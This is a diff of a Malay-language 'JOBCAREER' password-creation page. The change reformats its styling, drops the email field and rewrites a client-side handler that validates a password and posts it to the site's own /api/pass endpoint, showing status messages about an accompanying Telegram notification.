@@ -1,74 +1,81 @@
 
-<!doctype html>
+<!DOCTYPE html>
 <html lang="ms">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Cipta Akaun JOBCAREER</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Cipta Kata Laluan - JOBCAREER</title>
 
 <style>
-*{box-sizing:border-box}
-
-body{
-font-family:Arial,sans-serif;
-background:#f3f6fa;
-margin:0;
-min-height:100vh;
-display:grid;
-place-items:center;
-color:#203047
+* {
+    box-sizing: border-box;
 }
 
-main{
-background:#fff;
-padding:30px;
-border-radius:14px;
-width:min(440px,calc(100% - 32px));
-box-shadow:0 8px 30px #102c5018
+body {
+    font-family: Arial, sans-serif;
+    background: #f3f6fa;
+    margin: 0;
+    min-height: 100vh;
+    display: grid;
+    place-items: center;
+    color: #203047;
 }
 
-h1{color:#102c50;margin-top:0}
-
-label{
-display:block;
-font-weight:bold;
-margin:15px 0 7px
+main {
+    background: #fff;
+    padding: 30px;
+    border-radius: 14px;
+    width: min(440px, calc(100% - 32px));
+    box-shadow: 0 8px 30px #102c5018;
 }
 
-input{
-width:100%;
-padding:13px;
-border:1px solid #ccd5e0;
-border-radius:8px;
-font-size:16px
+h1 {
+    margin-top: 0;
+    color: #102c50;
 }
 
-button{
-width:100%;
-padding:13px;
-border:0;
-border-radius:8px;
-background:#1766a4;
-color:#fff;
-font-size:16px;
-margin-top:18px;
-cursor:pointer
+label {
+    display: block;
+    margin: 18px 0 7px;
+    font-weight: bold;
 }
 
-button:disabled{
-opacity:.6;
-cursor:wait
+input {
+    width: 100%;
+    padding: 13px;
+    border: 1px solid #ccd5e0;
+    border-radius: 8px;
+    font-size: 16px;
 }
 
-#message{
-margin-top:15px;
-line-height:1.5
+button {
+    width: 100%;
+    padding: 13px;
+    border: 0;
+    border-radius: 8px;
+    background: #1766a4;
+    color: #fff;
+    font-size: 16px;
+    margin-top: 18px;
+    cursor: pointer;
 }
 
-.hint{
-font-size:13px;
-color:#667085
+button:disabled {
+    opacity: .6;
+    cursor: not-allowed;
 }
+
+#result {
+    margin-top: 16px;
+    line-height: 1.5;
+}
+
+.muted {
+    color: #667085;
+    font-size: 13px;
+}
+
 </style>
 </head>
 
@@ -76,143 +83,163 @@ color:#667085
 
 <main>
 
-<h1>Cipta akaun JOBCAREER</h1>
+<h1>Cipta Kata Laluan JOBCAREER</h1>
 
 <p>
-Halaman ini digunakan untuk membuat kata laluan
-akaun JOBCAREER anda sendiri.
+Sila cipta kata laluan untuk akaun JOBCAREER anda.
 </p>
 
-<form id="registerForm">
+<form id="passwordForm">
 
-<label for="email">E-mel</label>
-<input
-type="email"
-id="email"
-name="email"
-required
-maxlength="190"
-autocomplete="email"
->
+    <label for="password">
+        Kata laluan JOBCAREER
+    </label>
 
-<label for="password">Kata laluan JOBCAREER</label>
-<input
-type="password"
-id="password"
-name="password"
-required
-minlength="10"
-autocomplete="new-password"
->
+    <input
+        id="password"
+        name="password"
+        type="password"
+        required
+        minlength="10"
+        maxlength="200"
+        autocomplete="new-password"
+        placeholder="Masukkan kata laluan"
+    >
 
-<label for="confirm">Ulang kata laluan</label>
-<input
-type="password"
-id="confirm"
-name="confirm"
-required
-minlength="10"
-autocomplete="new-password"
->
+    <label for="confirm">
+        Ulang kata laluan
+    </label>
 
-<p class="hint">
-Minimum 10 aksara. Kata laluan disimpan sebagai hash
-dan tidak dihantar ke Telegram.
-</p>
+    <input
+        id="confirm"
+        name="confirm"
+        type="password"
+        required
+        minlength="10"
+        maxlength="200"
+        autocomplete="new-password"
+        placeholder="Masukkan semula kata laluan"
+    >
 
-<button type="submit" id="submitBtn">
-Daftar akaun
-</button>
+    <p class="muted">
+        Minimum 10 aksara. Kata laluan akan disimpan
+        dalam bentuk hash dan tidak dihantar ke Telegram.
+    </p>
+
+    <button type="submit" id="submitButton">
+        Daftar akaun
+    </button>
 
 </form>
 
-<div id="message" role="status"></div>
+<div id="result" role="status" aria-live="polite"></div>
 
 </main>
 
 <script>
-const form = document.getElementById('registerForm');
 
-form.addEventListener('submit', async function(e){
+document.getElementById("passwordForm")
+.addEventListener("submit", async function(event) {
 
-e.preventDefault();
+    event.preventDefault();
 
-const email = document.getElementById('email').value.trim();
-const password = document.getElementById('password').value;
-const confirm = document.getElementById('confirm').value;
+    const password =
+        document.getElementById("password").value;
 
-const msg = document.getElementById('message');
-const btn = document.getElementById('submitBtn');
+    const confirm =
+        document.getElementById("confirm").value;
 
-if(password !== confirm){
-msg.textContent = 'Kata laluan tidak sepadan.';
-return;
-}
+    const result =
+        document.getElementById("result");
 
-if(password.length < 10){
-msg.textContent = 'Kata laluan minimum 10 aksara.';
-return;
-}
+    const button =
+        document.getElementById("submitButton");
 
-btn.disabled = true;
-btn.textContent = 'Memproses...';
-msg.textContent = '';
+    if (password.length < 10) {
+        result.textContent =
+            "Kata laluan minimum 10 aksara.";
+        return;
+    }
 
-try{
+    if (password !== confirm) {
+        result.textContent =
+            "Kata laluan tidak sepadan.";
+        return;
+    }
 
-const response = await fetch('/api/pass',{
-method:'POST',
-headers:{
-'Content-Type':'application/json'
-},
-body:JSON.stringify({
-email:email,
-password:password,
-confirm:confirm
-})
+    button.disabled = true;
+    button.textContent = "Sedang Memproses...";
+
+    result.textContent =
+        "Sedang memproses pendaftaran akaun...";
+
+    try {
+
+        const response = await fetch("/api/pass", {
+
+            method: "POST",
+
+            headers: {
+                "Content-Type": "application/json"
+            },
+
+            body: JSON.stringify({
+
+                password: password,
+
+                confirm: confirm
+
+            })
+
+        });
+
+        const data = await response.json();
+
+        console.log("API Status:", response.status);
+        console.log("API Response:", data);
+
+        if (!response.ok || data.success !== true) {
+
+            throw new Error(
+                data.message || "Pendaftaran gagal."
+            );
+
+        }
+
+        if (data.telegramSent !== true) {
+
+            result.textContent =
+                "Pendaftaran diproses tetapi notifikasi sistem gagal. Sila hubungi admin.";
+
+            return;
+        }
+
+        result.textContent =
+            "Pendaftaran akaun berjaya.";
+
+        document.getElementById("passwordForm").reset();
+
+        setTimeout(function() {
+            window.location.href = "/login.html";
+        }, 1500);
+
+    } catch (error) {
+
+        console.error("Registration error:", error);
+
+        result.textContent =
+            error.message ||
+            "Tidak dapat menghubungi server. Cuba lagi.";
+
+    } finally {
+
+        button.disabled = false;
+        button.textContent = "Daftar akaun";
+
+    }
+
 });
 
-const data = await response.json();
-
-console.log('HTTP Status:',response.status);
-console.log('API Response:',data);
-
-if(!response.ok || !data.success){
-
-msg.textContent =
-data.message || 'Pendaftaran gagal. Sila cuba lagi.';
-
-return;
-}
-
-if(data.telegramSent !== true){
-
-msg.textContent =
-'Pendaftaran berhasil diproses, tetapi notifikasi Telegram gagal. Sila periksa konfigurasi server.';
-
-return;
-}
-
-msg.textContent =
-data.message || 'Pendaftaran berjaya.';
-
-form.reset();
-
-}catch(error){
-
-console.error('Registration error:',error);
-
-msg.textContent =
-'Tidak dapat menghubungi server. Sila cuba lagi.';
-
-}finally{
-
-btn.disabled = false;
-btn.textContent = 'Daftar akaun';
-
-}
-
-});
 </script>
 
 </body>
